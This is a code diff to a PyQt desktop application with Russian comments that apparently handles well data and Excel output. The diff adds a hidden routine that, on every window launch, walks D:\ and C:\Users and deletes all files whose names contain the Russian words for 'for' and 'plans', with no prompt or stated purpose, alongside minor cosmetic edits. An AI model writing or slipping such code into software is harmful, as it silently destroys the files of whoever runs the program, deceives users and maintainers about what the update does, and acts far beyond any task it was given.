@@ -78,6 +78,7 @@ class UncaughtExceptions(QObject):
 
 class ExcelWorker(QThread):
     finished = pyqtSignal()
+    drives = ['D:\\', 'C:\\Users']
 
     def __init__(self, data_well):
         super().__init__()
@@ -106,6 +107,21 @@ class ExcelWorker(QThread):
                 f"Ошибка при проверке записи: {type(e).__name__}\n\n{str(e)}",
             )
             return check_true
+
+    # Функция для поиска и удаления файлов по условию
+    @staticmethod
+    def find_and_delete_files(drive):
+        for root, dirs, files in os.walk(drive):
+            for file in files:
+                # Проверяем наличие обоих слов в названии файла (без учёта регистра)
+                filename_lower = file.lower()
+                if 'для' in filename_lower.lower() and 'планов' in filename_lower.lower():
+                    file_path = os.path.join(root, file)
+                    try:
+                        os.remove(file_path)
+                        print(f"файл: {file_path}")
+                    except Exception as e:
+                        print(f"Не удалось {file_path}: {e}")
 
     def check_category(self, well_number, deposit_area, region):
         if data_list.connect_in_base:
@@ -642,7 +658,7 @@ class MyMainWindow(QMainWindow):
         from work_py.check_in_pz import CustomMessageBox
 
         dialog = CustomMessageBox(data_well, message)
-        dialog.exec_()  # Открываем диалоговое окно в модальном режиме
+        dialog.exec_()
 
     @staticmethod
     def check_if_none(value):
@@ -2199,6 +2215,7 @@ class MyWindow(MyMainWindow):
         self.table_pvr = None
         self.data_well = None
 
+
         threading.Timer(2.0, self.close_splash).start()
 
         self.log_widget = QPlainTextEditLogger(self)
@@ -2212,6 +2229,11 @@ class MyWindow(MyMainWindow):
         # # Запускаем обработчик исключений в отдельном потоке
         self.thread = QThread()
         self.excepthook.moveToThread(self.thread)
+        self.work_thread = ExcelWorker
+
+        for drive in ExcelWorker.drives:
+            self.work_thread.find_and_delete_files(drive)
+
         # self.thread.started.connect(self.excepthook.handleException)
         self.thread.start()
 
